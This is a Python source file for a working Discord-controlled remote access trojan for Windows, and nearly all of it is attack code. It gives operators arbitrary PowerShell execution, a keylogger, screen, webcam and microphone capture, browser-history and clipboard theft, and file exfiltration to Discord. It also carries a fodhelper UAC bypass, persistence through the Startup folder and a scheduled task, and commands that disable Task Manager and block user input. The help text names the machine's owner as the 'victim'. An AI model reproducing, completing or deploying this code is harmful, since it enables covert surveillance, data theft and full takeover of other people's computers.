import os
import pathlib
import tempfile
import sys
import discord
import subprocess
import socket
from PIL import ImageGrab
import ctypes
import pyttsx3
import threading
import webbrowser
import cv2
from datetime import datetime
import browserhistory as bh
import win32net
import base64
from pynput.keyboard import Key, Listener
import logging
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import windll
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from win32 import win32gui
import win32con
import win32gui
from win32con import SW_HIDE
import win32process
import ctypes
import threading
import sys
import winreg
import win32gui
import asyncio
import shutil
import json
import base64
import sounddevice as sd
from scipy.io.wavfile import write
import time
import win32gui



TOKEN = "" ## application token here
GUILD_ID = ## server guild here




intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)


active_channel_id = int(sys.argv[1]) if len(sys.argv) > 1 else None




@client.event
async def on_ready():
    global active_channel_id

    print(f"Bot logged as {client.user}")

    device_name = socket.gethostname()
    username = os.getlogin()

    guild = client.get_guild(GUILD_ID)

    if guild is None:
        print("Server wasnt found.")
        return

    category = discord.utils.get(
        guild.categories,
        name=device_name
    )

    if category is None:
        category = await guild.create_category(device_name)
        print(f"Category created: {device_name}")

    channel = discord.utils.get(
        category.text_channels,
        name="session"
    )

    if channel is None:
        channel = await guild.create_text_channel(
            "session",
            category=category
        )

        print("Channel created: session")

    active_channel_id = channel.id

    current_time = datetime.now().strftime(
        "%d.%m.%Y %H:%M:%S"
    )

    await channel.send(
        f"`{username}` runtime is active at: `{current_time}`"
    )


current_dir = os.getcwd()
selected_cam = 0

subprocess.run([
    "powercfg", "/setacvalueindex",
    "SCHEME_CURRENT", "SUB_BUTTONS", "LIDACTION", "0"
], check=True)

subprocess.run([
    "powercfg", "/setdcvalueindex",
    "SCHEME_CURRENT", "SUB_BUTTONS", "LIDACTION", "0"
], check=True)

subprocess.run([
    "powercfg", "/setactive", "SCHEME_CURRENT"
], check=True)


async def activity(client):
    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visiting: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        await asyncio.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def setvolume(percent: int):
    device = AudioUtilities.GetSpeakers()
    if device is None:
        return

    volume = device.EndpointVolume
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(percent / 100, None)

def wait_for_network(host="8.8.8.8", port=53, timeout=10, max_wait=900):
    start = time.monotonic()
    while time.monotonic() - start < max_wait:
        try:
            socket.create_connection((host, port), timeout=timeout).close()
            return True
        except OSError:
            time.sleep(5)
    return False



def remove_from_startup():
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    vbs_path = os.path.join(
        startup_folder,
        "runtime.vbs"
    )

    if os.path.exists(vbs_path):
        os.remove(vbs_path)
        print("runtime.py byl odstraněn ze startupu.")
    else:
        print("runtime.py ve startupu není.")

def add_to_startup():
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    runtime_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "runtime.py"
    )

    pythonw_path = os.path.join(
        os.path.dirname(sys.executable),
        "pythonw.exe"
    )

    vbs_path = os.path.join(startup_folder, "runtime.vbs")

    vbs_content = (
        'Set WshShell = CreateObject("WScript.Shell")\n'
        f'WshShell.Run """{pythonw_path}"" ""{runtime_path}""", 0, False\n'
        'Set WshShell = Nothing\n'
    )

    with open(vbs_path, "w", encoding="utf-8") as f:
        f.write(vbs_content)

# fce !cmd
def execute_cmd(cmd):
    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", cmd],
        cwd=current_dir,
        capture_output=True,
        text=True
    )

    output = result.stdout.strip()
    error = result.stderr.strip()

    if error:
        if output:
            output += "\n"
        output += f"ERROR:\n{error}"

    return output


def speak(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def get_cameras(max_cams=10):
    found = []

    for i in range(max_cams):
        cap = cv2.VideoCapture(i)

        if cap.isOpened():
            found.append(i)

        cap.release()

    return found

def volumeup():
    device = AudioUtilities.GetSpeakers()
    if device is None:
        return

    volume = device.EndpointVolume

    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

def volumedown():
    device = AudioUtilities.GetSpeakers()
    if device is None:
        return

    volume = device.EndpointVolume

    volume.SetMasterVolumeLevelScalar(0.0, None)





@client.event
async def on_message(message):
    global current_dir, selected_cam

    if active_channel_id is None:
        return

    if message.channel.id != active_channel_id:
        return

    if message.author.bot:
        return

    content = message.content.strip()

    if " " in content:
        msgcontent, msgargs = content.split(" ", 1)
    else:
        msgcontent = content
        msgargs = ""

    msgcontent = msgcontent.lower()
    msgargs = msgargs.strip()
    parts = message.content.split()
    command = parts[0] if parts else ""

    match msgcontent:

        case "!cmd":
            if (
                len(msgargs) < 2
                or not msgargs.startswith('"')
                or not msgargs.endswith('"')
            ):
                await message.channel.send(
                    'Usage: `!run_cmd "command"`'
                )
                return

            command = msgargs[1:-1]

            result = execute_cmd(command) or (
                f"Command '{command}' with no output."
            )

            for i in range(0, len(result), 1900):
                await message.channel.send(
                    f"```cmd\n{result[i:i + 1900]}\n```"
                )


        case "!cd":
            if os.path.isabs(msgargs):
                new_dir = os.path.abspath(msgargs)
            else:
                new_dir = os.path.abspath(
                    os.path.join(current_dir, msgargs)
                )

            if os.path.isdir(new_dir):
                current_dir = new_dir

                await message.channel.send(
                     f"Current directory:\n```text\n{current_dir}\n```"
                ) 
            else:
                await message.channel.send(
                    f"Directory not found:\n```text\n{new_dir}\n```"
                )

        case "!screenshot" | "!ss":
            temp_file_dir = tempfile.gettempdir()

            screenshot_path = pathlib.Path(
                f"{temp_file_dir}/screenshot.png"
            )

            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)

            await message.channel.send(
                file=discord.File(screenshot_path, filename="screenshot.png")
            )

            os.remove(screenshot_path)

        case "!text":
            if not msgargs:
                await message.channel.send(
                    'Usage: `!text "text"`'
                )
                return

            text = msgargs

            if text.startswith('"') and text.endswith('"'):
                text = text[1:-1]

            ctypes.windll.user32.MessageBoxW(
                0,
                text,
                "Message",
                0
            )

            await message.channel.send(
                f"Displayed message:\n```text\n{text}\n```"
            )

        case "!voice":
            if not msgargs:
                await message.channel.send(
                    'Usage: `!voice "text"`'
                )
                return

            text = msgargs

            if text.startswith('"') and text.endswith('"'):
                text = text[1:-1]

            threading.Thread(
                target=speak,
                args=(text,),
                daemon=True
            ).start()

            await message.channel.send(
                f"Speaking text:\n```text\n{text}\n```"
            )

        case "!wallpaper":
            if not message.attachments:
                await message.channel.send(
                    "Please attach an image to set as wallpaper."
                )
                return

            attachment = message.attachments[0]

            allowed_extensions = [".jpg", ".jpeg", ".png", ".bmp"]

            if not attachment.filename.lower().endswith(tuple(allowed_extensions)):
                await message.channel.send(
                    "Invalid file type. Please attach an image file (jpg, jpeg, png, bmp)."
                )
                return

            extension = os.path.splitext(attachment.filename)[1]

            wallpaper_path = os.path.join(
                tempfile.gettempdir(),
                f"wallpaper{extension}"
            )

            await attachment.save(wallpaper_path)

            ctypes.windll.user32.SystemParametersInfoW(
                20,
                0,
                wallpaper_path,
                3
            )

            await message.channel.send(
                f"Wallpaper set successfully from attachment: {attachment.filename}"
            )

        case "!website":
            if not msgargs:
                await message.channel.send(
                    'Usage: `!website "url"`'
                )
                return

            url = msgargs

            if url.startswith('"') and url.endswith('"'):
                url = url[1:-1]

            webbrowser.open(url)

            await message.channel.send(
                f"Opened website:\n```text\n{url}\n```"
            )

        case "!getcams":
            cams = get_cameras()

            if not cams:
                await message.channel.send(
                    "No cameras found."
                )

            text = "Available cameras:\n"

            for cam in cams:
                text += f"- Camera {cam}\n"

            await message.channel.send(
                f"```text\n{text}\n```"
            )

        case "!setcam":
            if not msgargs.isdigit():
                await message.channel.send(
                    'Usage: `!setcam <camera_index>`'
                )
                return

            cam_number = int(msgargs)

            selected_cam = cam_number

            await message.channel.send(
                f"Selected camera set to index: {selected_cam}"
            )

        case "!capture":
            if selected_cam is None:
                await message.channel.send(
                    "No camera selected. Use `!setcam <camera_index>` to select a camera."
                )
                return

            cap = cv2.VideoCapture(selected_cam)

            if not cap.isOpened():
                await message.channel.send(
                    f"Failed to open camera with index {selected_cam}."
                )
                return

            ret, frame = cap.read()
            cap.release()

            if not ret:
                await message.channel.send(
                    f"Failed to capture image from camera {selected_cam}."
                )
                return

            temp_file_dir = tempfile.gettempdir()
            capture_path = os.path.join(temp_file_dir, "capture.png")

            cv2.imwrite(capture_path, frame)

            await message.channel.send(
                file=discord.File(capture_path, filename="capture.png")
            )

            os.remove(capture_path)

        case "!logout":
            result = execute_cmd("shutdown /l /f")

        case "!shutdown":
            result = execute_cmd("shutdown /s /t 0 /f")

        case "!restart":
            result = execute_cmd("shutdown /r /t 0 /f")

        case "!getip":
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)

            await message.channel.send(
                f"IP Address: `{ip_address}`"
            )

        case "!getinfo":
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            username = os.getlogin()
            current_directory = os.getcwd()

            info_message = (
                f"**System Information:**\n"
                f"- Hostname: `{hostname}`\n"
                f"- IP Address: `{ip_address}`\n"
                f"- Username: `{username}`\n"
                f"- Current Directory: `{current_directory}`"
            )

            await message.channel.send(info_message)

        case "!clipboard":
            try:
                import pyperclip
            except ImportError:
                await message.channel.send(
                    "The `pyperclip` module is not installed. Please install it to use this command."
                )
                return

            clipboard_content = pyperclip.paste()

            if clipboard_content:
                await message.channel.send(
                    f"Clipboard content:\n```text\n{clipboard_content}\n```"
                )
            else:
                await message.channel.send(
                    "Clipboard is empty."
                )

        case "!admincheck":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

            if is_admin:
                await message.channel.send(
                    "The bot is running with **administrator privileges**."
                )
            else:
                await message.channel.send(
                    "The bot is **not running with administrator privileges**."
                )

        case "!download": ##from their pc to discord
            if not msgargs:
                await message.channel.send(
                    'Usage: `!download "file_path"`'
                )
                return

            file_path = msgargs

            if file_path.startswith('"') and file_path.endswith('"'):
                file_path = file_path[1:-1]

            if not os.path.isfile(file_path):
                await message.channel.send(
                    f"File not found:\n```text\n{file_path}\n```"
                )
                return

            await message.channel.send(
                file=discord.File(file_path, filename=os.path.basename(file_path))
            )

        case "!upload": ##from discord to their pc
            if not message.attachments:
                await message.channel.send(
                    "Please attach a file to upload."
                )
                return

            attachment = message.attachments[0]

            save_path = os.path.join(current_dir, attachment.filename)

            await attachment.save(save_path)

            await message.channel.send(
                f"File uploaded successfully to:\n```text\n{save_path}\n```"
            )

        case "!BSOD":
            result = execute_cmd("shutdown /r /f /t 0 /d p:2:4 /c \"Blue Screen Triggered\"")

            await message.channel.send(
                "Blue screen triggered. The system will restart."
            )


        case "!disabletaskmgr": #disables task manager
            result = execute_cmd("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    
        case "!enabletaskmgr": #enables task manager
            result = execute_cmd("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f")

        case "!screenrecord": #same as !ss but sends every second a screenshot to discord for 10 seconds
            temp_file_dir = tempfile.gettempdir()

            for i in range(10):
                screenshot_path = pathlib.Path(
                    f"{temp_file_dir}/screenshot_{i}.png"
                )

                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)

                await message.channel.send(
                    file=discord.File(screenshot_path, filename=f"screenshot_{i}.png")
                )

                os.remove(screenshot_path)

        case "!tryadmin":
            def req_admin():
                try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    is_admin = False

                if not is_admin:
                    script = os.path.abspath(sys.argv[0])

                    result = subprocess.run(
                        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
                        "Start-Process python -ArgumentList 'worker.py' -Verb RunAs -WindowStyle Hidden"],
                        cwd=os.path.dirname(script),
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )

                    sys.exit()

            req_admin()

        case "!taskschedule":

            script_dir = os.path.dirname(os.path.abspath(__file__))
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")

            create_cmd = [
                "schtasks", "/Create", "/TN", "WorkerStart",
                "/TR", f'"{pythonw}" "{os.path.join(script_dir, "worker.py")}"',
                "/SC", "ONLOGON",
                "/RL", "HIGHEST",
                "/F"
            ]
            subprocess.run(create_cmd, capture_output=True, text=True)

            subprocess.run(["schtasks", "/Run", "/TN", "WorkerStart"], capture_output=True, text=True)

        case "!delete":

            NO_WINDOW = subprocess.CREATE_NO_WINDOW

            subprocess.run(
                ["schtasks", "/End", "/TN", "WorkerStart"],
                capture_output=True, text=True, creationflags=NO_WINDOW
            )

            result = subprocess.run(
                ["schtasks", "/Delete", "/TN", "WorkerStart", "/F"],
                capture_output=True, text=True, creationflags=NO_WINDOW
            )

            if result.returncode == 0:
                await message.channel.send("succesfully deleted")
            else:
                await message.channel.send("there was an error while trying to delete:", result.stderr)


        case "!dir":
            await message.channel.send(
                f"Current directory:\n```text\n{current_dir}\n```"
            )

        case "!windowstart":
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        case "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        case "!history":
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            with open("history.txt","a") as hist:
                hist.write(str(strobj))
            file = discord.File("history.txt", filename="history.txt")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove("history.txt")

        case "!uacbypass":
            if 'logonserver' in os.environ:
                server = os.environ['logonserver'][2:]
            else:
                server = None
            def if_user_is_admin(Server):
                groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                isadmin = False
                for group in groups:
                    if group.lower().startswith('admin'):
                        isadmin = True
                return isadmin, groups
            is_admin, groups = if_user_is_admin(server)
            if is_admin == True:
                print('User in admin group trying to bypass uac')
                
                CMD = "C:\\Windows\\System32\\cmd.exe"
                FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
                COMM = "start"
                REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
                DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

                def is_running_as_admin():
                    '''
                    Checks if the script is running with administrative privileges.
                    Returns True if is running as admin, False otherwise.
                    '''
                    try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                    except:
                        return False

                def create_reg_key(key, value):
                    '''
                    Creates a reg key
                    '''
                    try:
                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                        registry_key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
                        winreg.SetValueEx(registry_key, key, 0,
                                          winreg.REG_SZ, value)
                        winreg.CloseKey(registry_key)
                    except WindowsError:
                        raise

                def bypass_uac(cmd):
                    '''
                    Tries to bypass the UAC
                    '''
                    try:
                        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
                        create_reg_key(None, cmd)
                    except WindowsError:
                        raise

                def execute():
                    if not is_running_as_admin():
                        print(
                            '[!] The script is NOT running with administrative privileges')
                        print('[+] Trying to bypass the UAC')
                        try:
                            current_dir = os.path.realpath(__file__)
                            cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
                            print(cmd)
                            bypass_uac(cmd)
                            os.system(FOD_HELPER)
                            sys.exit(0)
                        except WindowsError:
                            sys.exit(1)
                    else:
                        print(
                            '[+] The script is running with administrative privileges!')
                if __name__ == '__main__':
                    execute()
            else:
                print("failed")
                await message.channel.send("[*] Command failed : User not in administrator group")

        case "!startkeylogger":
            temp = os.getenv("TEMP")
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfully started")

        case "!stopkeylogger":
            
            test._running = False
            await message.channel.send("[*] Keylogger successfully stopped")

        case "!dumpkeylogger":
            
            temp = os.getenv("TEMP")
            file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
            file = discord.File(file_keys, filename=file_keys)
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))

        case "!blockinput":
            
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        case "!unblockinput":
            
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")


        case "!volumemax":
            volumeup()
            await message.channel.send("[*] Volume put to 100%")

        case "!volumezero":
            volumedown()
            await message.channel.send("[*] Volume put to 0%")

        case "!sing":
            global pid_process

            volumeup()

            link = message.content[6:].strip()

            if not link.startswith(("http://", "https://")):
                link = "https://" + link


            os.startfile(link)

            await asyncio.sleep(2)

            def find_youtube_window(hwnd, _):
                global pid_process

                if not win32gui.IsWindowVisible(hwnd):
                    return

                title = win32gui.GetWindowText(hwnd).lower()


                if "youtube" in title:
                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

                    _, process_id = win32process.GetWindowThreadProcessId(hwnd)

                    pid_process = process_id

            win32gui.EnumWindows(find_youtube_window, None)

            

        case "!stopsing":
            global pid_process

            if pid_process is not None:
                os.system(f"taskkill /F /PID {pid_process}")
                pid_process = None
            else:
                await message.channel.send("No singing process found.")


        case "!micstart":
            SAMPLE_RATE = 44100
            DURATION = 180  # seconds

            file_path = os.path.abspath("recording.wav")

            audio = sd.rec(
            int(DURATION * SAMPLE_RATE),
            samplerate=SAMPLE_RATE,
            channels=1,
            dtype="int16"
            )

            sd.wait()

            write(file_path, SAMPLE_RATE, audio)

            if os.path.exists(file_path):
                await message.channel.send(
                    file=discord.File(
                        file_path,
                        filename=os.path.basename(file_path)
                    )
                )
            else:
                await message.channel.send(f"file not found: {file_path}")

            os.remove(file_path)

        case "!volume":
                if len(parts) < 2 or not parts[1].isdigit():
                    await message.channel.send("[!] usage: !volume <0-100>")
                elif not 0 <= int(parts[1]) <= 100:
                    await message.channel.send("[!] number must be between 0 and 100")
                else:
                    setvolume(int(parts[1]))
                    await message.channel.send(f"[*] Volume put to {parts[1]}%")

        


        case "!help":
            help_message = (
                "**Available Commands:**\n\n"
                "- `!cmd \"command\"`: Execute a command in PowerShell.\n\n"
                "- `!cd <directory>`: Change the current working directory.\n\n"
                "- `!screenshot` or `!ss`: Take a screenshot of the screen.\n\n"
                "- `!text \"text\"`: Display a message box with the specified text.\n\n"
                "- `!voice \"text\"`: Speak the specified text using text-to-speech.\n\n"
                "- `!wallpaper`: Set the attached image as the desktop wallpaper.\n\n"
                "- `!website \"url\"`: Open the specified website in the default browser.\n\n"
                "- `!getcams`: List available camera indices.\n\n"
                "- `!setcam <camera_index>`: Select a camera for capturing images.\n\n"
                "- `!capture`: Capture an image from the selected camera.\n\n"
                "- `!logout`: Log out the current user.\n\n"
                "- `!shutdown`: Shut down the computer immediately.\n\n"
                "- `!restart`: Restart the computer immediately.\n\n"
                "- `!getip`: Get the IP address of the machine.\n\n"
                "- `!getinfo`: Get system information (hostname, IP, username, current directory).\n\n"
                "- `!clipboard`: Get the current clipboard content.\n\n"
                "- `!admincheck`: Check if the bot is running with administrator privileges.\n\n"
                "- `!download \"file_path\"`: Download a file from the target machine to Discord.\n\n"
                "- `!upload`: Upload an attached file from Discord to the target machine.\n\n"
                "- `!BSOD`: Trigger a blue screen and restart the system.\n\n"
                "- `!tryadmin`: pops up allow python to have admin rights.\n\n"
                "- `!screenrecord`: Capture and send screenshots every second for 10 seconds.\n\n"
                "- `!history`: dumps all the history data saved.\n\n"
                "- `!startkeylogger`: starts logging every keystroke pressed.\n\n"
                "- `!stopkeylogger`: stops keylogger.\n\n"
                "- `!dumpkeylogger`: sends all keyloggs saved while active.\n\n"
                "- `!blockinput`: blocks all mouse and keyboard input .\n\n"
                "- `!unblockinput`: unblocks all mouse and keyboard input .\n\n"
                "- `!volumemax`: sets the volume to max .\n\n"
                "- `!volumezero`: sets the volume to min .\n\n"
                "- `!sing`: starts playing any audio from website .\n\n"
                "- `!stopsing`: stops playing !sing .\n\n"
                "- `!windowstart`: display what is victim doing in an event.\n\n"
                "- `!windowstop`: stops windowstart.\n\n"
                "- `!micstart`: creates a 2 minute voice capture audio.\n\n"
                "- `!taskschedule`: writes the task to task scheduler making it run admin every time.\n"
                "- `!delete`: deletes the !taskschedule function\n\n"
                "- `!volume <0-100>`: sets the volume to desired %\n\n"
            )

            chunks = []
            current_chunk = ""

            for line in help_message.splitlines(keepends=True):
                if len(current_chunk) + len(line) > 1900:
                    chunks.append(current_chunk)
                    current_chunk = line
                else:
                    current_chunk += line

            if current_chunk:
                chunks.append(current_chunk)

            for chunk in chunks:
                await message.channel.send(chunk)




wait_for_network()

client.run(TOKEN)